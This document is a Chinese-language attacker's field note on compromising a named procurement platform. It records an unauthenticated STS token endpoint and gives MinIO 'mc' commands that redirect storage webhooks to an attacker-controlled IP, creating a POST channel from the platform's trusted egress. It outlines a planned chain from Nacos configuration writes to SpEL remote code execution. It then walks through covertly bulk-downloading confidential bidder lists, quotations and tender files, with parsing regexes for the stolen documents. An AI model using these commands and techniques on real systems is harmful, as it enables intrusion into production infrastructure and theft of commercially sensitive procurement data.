# 对象存储通知 → 任意 URL POST 原语（含致命限制）

来源：2026-09 优智采系白标平台（zb.lyc.cn）实操。适用场景：**已有对象存储 admin，但缺一条 POST/写通道**（GET-SSRF 打不进只吃 POST 的控制面，如 Nacos 登录/配置写入）。

## 一、做法（MinIO 为例）

前置：对象存储 root/STS（该平台除 root 外，还有**零认证 STS 接口** `GET /gateway/evaltool/fileDecrypt/getOssSecurityTokenBySts`）。客户端 `mc`（跳板上常已有二进制；`dl.min.io/.../linux-amd64/mc` 可能 410，改走 archive 或从他机 scp）。

```bash
MC=/root/mig/mc2
$MC alias set tgt https://<host>:10000 <AK> <SK> --insecure
$MC admin info tgt --insecure                    # 版本/节点（分布式模式 admin v3 update 不可用，别指望"自定义更新源 RCE"）
$MC admin config set tgt notify_webhook:1 endpoint=http://<我方公网IP>/minio_notify queue_limit=10000 --insecure
# ↑ 写入后**必须重启才生效**（读回仍是 enable=off）
# 重启：`mc admin service restart` 需要 TTY，非交互报 "could not open a new TTY"
#      → python pty.fork 包一层并写 "y\n"；实测 3 节点同时重启 ~0.3s
$MC event add tgt/<bucket> arn:minio:sqs::1:webhook --event put --ignore-existing --insecure
$MC cp /etc/hostname tgt/<bucket>/probe.txt --insecure          # 触发
```

对方发来的（**原语成立**，落在跳板监听器上）：

```json
{"method":"POST","path":"/minio_notify","ua":"Go-http-client/1.1","client":"<平台出口IP>",
 "body":"{\"EventName\":\"s3:ObjectCreated:Put\",\"Key\":\"<bucket>/<我们上传的对象名>\",\"Records\":[...]}"}
```

- 源 IP = **平台出口**（不是我们的机器）⇒ 等价"来自受信网段的 POST"
- **URL 查询串完全可控**（endpoint 就是整条 URL）⇒ 对 `@RequestParam` 型接口（Nacos `/v1/cs/configs?dataId=..&group=..&content=..&username=..`）**参数可从 URL 注入**
- body 固定结构，但 `Key` 等字段来自我们上传的对象名 ⇒ 部分可控
- 跳板监听器必须用 **HTTP/1.0 短连接**，否则取数方等 keep-alive 挂住，表现为"接口超时"

## 二、🔴 致命限制：对象存储多半不在内网

`mc admin config set` **当场做 DNS/连接校验**，不通即拒：

```
Unable to set 'notify_webhook:1 endpoint=http://nacos-node1.ahyzc.com:8848/...':
  error (1:webhook): dial tcp: lookup nacos-node1.ahyzc.com on 223.5.5.5:53: no such host.
```

⇒ 对象存储用**公网 DNS**、不在厂商内网：**打不到内网控制面**。"
对象存储 webhook → Nacos 配置写入 → 网关 SpEL RCE"这条链**在第三步断掉**——先跑一条 set 命令验证可达性，再决定投不投入，别把重启生产存储当第一步。
可用范围 = 对象存储自己能解析/连通的地址（公网 + 同网段主机/端口）。

## 三、还原（生产改动，收工必做）

```bash
$MC event remove tgt/<bucket> arn:minio:sqs::1:webhook --event put --force --insecure   # "no notification configuration matched" = 本就没有，正常
$MC admin config reset tgt notify_webhook:1 --insecure
$MC admin service restart tgt   (pty, "y")
$MC admin config get tgt notify_webhook --insecure | grep -q 'enable=off' || echo "未还原!"
$MC ls tgt/<bucket>/ --insecure                                  # 测试对象已清
```

涉及**重启生产服务**的改动，动手前按用户铁律先告知并拿明确同意；改完立刻还原并在报告里记"改了什么、还原了没有"。

## 四、顺带：对象存储里的"文档池"往往是情报金矿

平台把每份文档的**成品报表**都落在桶里（实测 13k+ 对象）：投标人名单 / 报价一览表 / 多轮报价明细汇总表(报价得分) / 评标结果汇总 / 保证金明细，以及供应商加密标书 `*.bzc`/`*.tzc`。全只读、零痕迹。

```bash
$MC ls --recursive --json tgt/<bucket> > objs.jsonl   # ⚠️ 别用 `mc find --name`（某版本不生效，输出为空）
# 过滤 key → xargs -P8 并行 mc cp 下载 → 批量 pdftotext -layout → 结构化
```
解析要点：项目编号正则**别用只含 `[A-Za-z0-9-]` 的字符类**（中文全角连字符会截断），用 `项目编号[:：]\s*(\S+)`；名单行 `^\s*(\d+)\s+(.+?)\s{2,}(\d{7,11})\s+(\S.*)$`；报价取含「投标总报价」的行按 2+ 空格切。**必须剔测试数据**（实测 179 条里仅 133 条为真实业务）。
